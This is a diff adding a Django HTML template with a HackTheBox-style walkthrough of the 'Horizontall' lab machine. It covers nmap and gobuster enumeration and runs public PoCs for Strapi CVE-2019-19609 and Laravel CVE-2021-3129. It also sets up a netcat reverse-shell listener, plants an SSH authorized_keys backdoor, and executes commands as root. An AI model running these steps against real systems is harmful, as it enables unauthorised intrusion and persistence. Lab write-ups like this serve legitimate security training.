@@ -1,0 +1,198 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">Horizontal</h1>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>|_$sudo nmap -p- -sCV IP --min-rate=2000 > ~/tempo/nmap.txt</code></pre></div>
+    <div class="img">
+            <img src="{% static 'EthHack/images/horizontal/1-nmap.png' %}">
+            <p class="text">
+                Nmap revealed open ports. This is basic result of nmap. SSH and HTTP are open, so the main target would be the HTTP. <br><br>
+                I reccomend you to save nmap output so that you can see anytime you want. <br> <br>
+                Also, sometime irregular port is open, so <u>-p-</u> option can cut meaningless time.
+            </p>
+    </div>
+
+    <p class="text">When I open http://IP, the webserver error is displayed. Therefore, we need to add DNS to /etc/hosts</p>
+    <div class="code-box"><pre><code>echo 'IP horizontall.htb' | sudo tee -a /etc/host</code></pre></div>
+
+    <p class="text">Then, we can access to the website.</p>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/horizontal/2-web-page.png' %}" alt="">
+        <p class="text">
+            This website seems to not have functionality. Even if I press several buttons, those don't respond. Also, there is no interesting directory. With gobuster, I found css and js directories, but nothing usefull dir. <br> <br>
+            Therefore, we need to find a subdomain or CMS framework to pwn this machine.
+        </p>
+    </div>
+    
+    <div class="img">
+        <img src="{% static 'EthHack/images/horizontal/3-suspicious-js.png' %}" alt="">
+        <p class="text">
+            As I said, the debugger page found interesting js file. It is not framework, also not utility. It's worth to observe contents. <br> <br>
+            I created string check tool. You can visit the function via home -> tools -> trgins check. <br> <br>
+            <a href="{% url 'string_check' %}">Here is the page.</a> 
+        </p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/horizontal/3-5-string-check.png' %}" alt="">
+        <p class="text">
+            I copied and pasted the whole code, and searched if there is string "horizontall.htb", to find subdomain. <br> <br>
+            As you can see, the subdomain "api-prod.horizontall.htb" is set. <br> <br>
+            This image isn't large enough, so please zoom-in and look at the markered string in yellow.
+        </p>
+    </div>
+
+    <p class="text">As usuall, let's add the subdomain to our /etc/hosts, and access to there.</p>
+
+    <div class="code-box"><pre><code>echo "IP api-prod.horizontall.htb" | sudo tee -a /etc/hosts</code></pre></div>
+
+    <p class="text">As soon as we access to the website, there is only string "welcome". So, let's emumerate the directories and find exploitable vulnerability.</p>
+
+    <div class="code-box">
+        <pre><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content -u http://api-prod.horizontall.htb -t 70 > ~/tempo/gobuster.txt</code></pre>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/horizontal/4-gobuster.png' %}" alt="">
+        <p class="text">
+            As you can see, there are several direcvory and files that could have important information, but we will start from /admin page. <br> <br>
+            Freaqently. the admin page or login page include the CMS framework and its version. <br><br>
+            Therefore, admin page is often the most prioritized clue. When you find the page where could show you CMS and version information, you should visit there as soon as possible.
+        </p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/horizontal/5-strapi.png' %}" alt="">
+        <p class="text">
+            In admin page, we could finally find the CMS : strapi. Strapi is the open-source Headless CMS for developers. <br><br>
+            However, there is no version information, which is really important. We can test all possible vulnerabilities, but it takes huge time. So, we need to narrow it down.
+        </p>
+    </div>
+
+    <h2 class="subtitle">Foothold</h2>
+    <p class="text">Let's find vulnerabilities which we can possibly use.</p>
+    <div class="code-box"><pre><code>searchsploit strapi</code></pre></div>
+    <div class="img">
+        <img src="{% static 'EthHack/images/horizontal/6-searchsploit.png' %}" alt="">
+        <p class="text">There are 4 exploits. <br><br> Remember, our target website uses strapi as CMS(contents management system), and there was no reference to nodejs. Therefore, the third one might be usable.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/horizontal/7-version-check.png' %}" alt="">
+        <p class="text">
+            Looking at the source codes of the PoC, there is version check section. <br>
+            And the location "url/admin/init" seems to have version information. Make it sure, let's check the location.
+        </p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/horizontal/8-version.png' %}" alt="">
+        <p class="text">
+            As stated above, we could find the framework version, and it matches the version we can exploit with the python executable. <br><br>
+            Let's clone it and exploit the strapi.
+        </p>
+    </div>
+
+    <div class="code-box"><pre><code>nc -lvnp PORT_NUM</code></pre></div>
+    <div class="code-box"><pre><code>git clone https://github.com/glowbase/CVE-2019-19609.git
+cd CVE*
+python3 exploit.py rhost lhost lport</code></pre></div>
+<p class="text"><strong>NOTE</strong> : Rhost should be : http://api-prod.horizontall.htb/</p>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/horizontal/9-revshell.png' %}" alt="">
+        <p class="text">We could get reverse shell. Get to next step : privilege escalation. <br>
+        </p>
+    </div>
+
+    <p class="text">Before move, when I checked the current directory, it was /opt/strapi/...</p>
+    <p class="text">It does mean we can create authorized_keys file inside of ./ssh dir, and make connection via ssh. Let's do this.</p>
+
+    <p class="text">On remote machine,</p>
+    <div class="code-box">
+        <pre><code>|_$ cd /opt/strapi
+|_$mkdir .ssh</code></pre>
+    </div>
+    <p class="text">and in local machine,</p>
+    <div class="code-box">
+        <pre><code>|_$ssh-keygen
+<strong>Enter file in which to save the key (home/name/.ssh/id...) : strapi</strong>
+|_$cat strapi.pub #file which above code made</code></pre>
+    </div>
+    <p class="text">Finally, on remote machine,</p>
+    <div class="code-box"><pre><code>echo "CONTENT_OF_STRAPI.PUB" > .ssh/authorized_keys</code></pre></div>
+
+    <p class="text">Then, we can access horizontall.htb with ssh-key.</p>
+    <div class="code-box"><pre><code>|_$ ssh -i strapi strapi@horizontall.htb</code></pre></div>
+    <p class="text">You can get user.txt in current directory.</p>
+
+    <h2 class="subtitle">Privilege Escalation</h2>
+    <div class="code-box"><pre><code>|_$sudo -l</code></pre></div>
+    <p class="text">we cannot use this way because we don't know user's password. So, we need to find other way.</p>
+    <div class="code-box"><pre><code>|_$ netstat -tulnp</code></pre></div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/horizontal/12-tcp-and-local-port.png' %}" alt="">
+        <p class="text">Here, there are interesting open port :1337 and :8000. Port 3306 is default mysql port, so we don't use this at this time.
+            <br>Take a look at port 1337 with curl, it seems to be the website we saw in http://api-prod.horizontal.htb/. So, we focus on port 8000.
+        </p>
+    </div>
+
+    <p class="text">This command connects our port and port:8000 on remote machine, and make it possible to see the closed open port on remote machine.</p>
+    <div class="code-box"><pre><code>|_$ssh -i strapi -L 8000:localhost:8000 strapi@horizontall.htb</code></pre>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/horizontal/13-laravel.png' %}" alt="">
+        <p class="text">The port:8000 hosts web application framework. And this could be exploitable to get root privilege. <br><br>
+        Let's enumerate directories and make sure if it is exploitable.</p>
+    </div>
+
+    <div class="code-box">
+        <pre><code>gobuster -dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://localhost:8000 -t 80</code></pre>
+    </div>
+    <p class="text">It outputs /profiles dir. Let's visit there.</p>
+    <p class="text">The page looks like debug page cuz the page shows html structures and some information about page variables. This app can provide us gateway to the root privilege.</p>
+    <p class="text">Again, we can search Laravel with searchsploit.</p>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/horizontal/15-searchsploit-laravel.png' %}" alt="">
+        <p class="text">The third one tells us Laravel version 8.4.2 debug mode is vulnerable.</p>
+    </div>
+
+    <p class="text">However,</p>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/horizontal/16-laravel-version.png' %}" alt="">
+        <p class="text">This page tells us this page uses version 8.43.0. Can we exploit this?</p>
+    </div>
+
+    <p class="text">In short, the answer is YES. Based on this <a href="https://nvd.nist.gov/vuln/detail/cve-2021-3129">PoC</a>, the trigger of the vulnerability is an error handler and debugging tool used in Laravel. Therefore, it doesn't depends on Laravel version, but ignition version.</p>
+
+    <div class="code-box"><pre><code>$ git clone https://github.com/nth347/CVE-2021-3129_exploit.git
+$ cd CVE*
+$ chmod +x exploit.py
+$ python3 exploit.py http://localhost:8000 Monolog/RCE1 id</exploit></code></pre></div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/horizontal/17-id.png' %}" alt="">
+        <p class="text">Finally, we succeeded to gain root privilege. It's possible to establish reverse shell, but we can read root flag directly.</p>
+    </div>
+    <div class="code-box">
+            <pre><code>$ python3 exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"</code></pre>
+    </div>
+
+    <h2 class="subtitle">Additionals</h2>
+    <p class="text">If you are curious about the vulnerabilities we exploited, please visit There.</p>
+    <p class="text"><a href="{% url 'laravel-cve-2021-3129' %}">Laravel CVE</a> and <a href="{% url 'Strapi-cve-2019-19609' %}">Strapi CVE</a></p>
+</body>
+</html>
